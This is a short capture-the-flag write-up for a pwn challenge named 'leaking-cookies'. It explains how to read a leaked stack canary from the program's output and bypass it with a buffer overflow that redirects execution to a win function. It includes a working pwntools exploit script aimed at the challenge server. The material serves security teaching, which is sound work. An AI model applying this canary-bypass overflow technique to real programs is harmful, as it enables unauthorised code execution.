# Summary 
For this pwn challenge we need to use leaked cookies in order to bypass the check for an overflow inside of a program.

# Pathway
The path we need to take for this program is that we are given multiple addresses from the program and by looking at the code (or by guessing and checking) you can find that the third to last entry is the stack cookie. From there we can overwrite the stack cookie, continue to overrite the base pointer, then add a malicous return address to the win function to get the flag

# Script
```python
from pwn import *

if __name__ == "__main__":
    context.log_level = "error"
    # io = process("./leaking-cookies")
    io = remote("chal.ctf-league.osusec.org", 1335)
    
    # grab info
    provided_addrs = io.recvlineS(False)
    print(provided_addrs)
    
    # stack cookie is third to last
    cookie = int(provided_addrs.split()[-3], 16)
    print(cookie)
    
    exe = ELF("./leaking-cookies")
    win_addr = exe.symbols["win"]
    # overflow + cookie + base pointer + malicious return address
    payload = b"A"*24 + p64(cookie) + p64(0xdeadbeef) + p64(win_addr)
    
    io.sendline(payload)
    print(io.recvuntil(b"}").decode())
```